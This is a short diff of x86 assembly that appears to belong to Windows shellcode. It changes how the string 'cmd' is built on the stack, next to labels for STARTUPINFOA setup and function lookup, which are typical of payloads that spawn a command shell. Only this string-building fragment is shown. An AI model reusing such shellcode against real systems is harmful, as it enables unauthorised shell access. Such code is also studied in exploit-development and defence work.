@@ -203,9 +203,8 @@ create_startupinfoa:
 ; EDI = addr of find_function
 
 create_cmd_string:
-  mov edx, 0xFF9B929D       ;
-  neg edx                   ; EDX = "cmd\\0"
-  push edx                  ; push "cmd\\0" on stack
+  push 'd'                  ; push "d\\0"
+  push word 0x6D63          ; push "cm"
   push esp                  ; get pointer to string
   pop edx                   ; EDX = ptr to "cmd\\0"
 
